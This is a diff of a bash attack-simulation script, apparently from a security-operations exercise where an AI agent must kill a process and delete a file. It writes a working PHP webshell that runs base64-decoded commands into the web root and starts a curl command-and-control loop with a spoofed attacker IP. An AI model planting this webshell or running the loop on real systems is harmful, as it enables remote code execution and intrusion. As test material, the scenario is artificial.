@@ -1,8 +1,5 @@
 #!/bin/bash
-# Hard: Active Webshell C2
-# Plants a PHP backdoor in the web root, then continuously sends shell commands
-# to it via HTTP — generating distinctive access log entries.
-# The agent must BOTH kill this process (kill_process) AND delete the file (delete_file).
+# Hard: Active Webshell C2 Attack - plants a PHP backdoor in the web root, then continuously sends shell commands
 
 if [ -f /tmp/micro_soc_state.env ]; then
     source /tmp/micro_soc_state.env
@@ -16,12 +13,12 @@ fi
 
 BACKDOOR="/var/www/html/$BACKDOOR_FILE"
 
-echo "hard_attack: planting backdoor at $BACKDOOR"
+echo "Hard attack scenario: planting backdoor at $BACKDOOR"
 cat > "$BACKDOOR" << 'EOF'
 <?php if(isset($_GET['cmd'])){ @system(base64_decode($_GET['cmd'])); } ?>
 EOF
 
-echo "hard_attack: backdoor planted ($BACKDOOR_FILE), starting C2 loop from $ATTACKER_IP"
+echo "Starting hard scenario attack: backdoor planted ($BACKDOOR_FILE), starting C2 loop from $ATTACKER_IP"
 while true; do
     # Send encoded shell commands to the webshell
     curl -s -H "X-Forwarded-For: $ATTACKER_IP" \
